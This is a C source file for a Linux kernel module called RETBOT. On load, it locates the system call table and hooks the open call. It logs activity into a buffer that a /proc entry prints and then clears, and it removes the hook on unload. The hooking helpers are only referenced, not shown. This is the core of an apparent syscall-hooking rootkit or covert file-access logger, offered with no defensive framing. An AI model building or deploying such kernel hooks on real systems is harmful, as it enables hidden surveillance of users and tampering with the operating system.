#include "retbot.h"

char message_buffer[CYCLE_BUFFER_SIZE];

static void __init RETBOT_load_module( void ) { 

	unsigned long **table = NULL;

	memset( message_buffer, 0, CYCLE_BUFFER_SIZE );
 	proc_create( PROC_NAME, 0, NULL, &RETBOT_proc_info );

 	table = COLLECTOR_find_table();

 	if (NULL != table) {
 		COLLECTOR_hook_open( table );
 	}
 	
 	printk( "Loaded!\n" );
}

static void __exit RETBOT_unload_module( void ) {

	unsigned long **table = NULL;

	table = COLLECTOR_find_table();

	if (NULL != table){
		COLLECTOR_unhook_open( table );
	}

	remove_proc_entry( PROC_NAME, NULL );
	printk( "Unloaded!\n" );
}

int RETBOT_open_proc( struct inode *inode, struct file *file ) {

	return single_open( file, RETBOT_print_logs, NULL );
}

int RETBOT_print_logs( struct seq_file *m, void *v ) {

	seq_printf( m, RECORDER_get_buffer() );
	RECORDER_clean_buffer();
	return 0;
}

module_init( RETBOT_load_module );
module_exit( RETBOT_unload_module );

MODULE_LICENSE( "GPL" );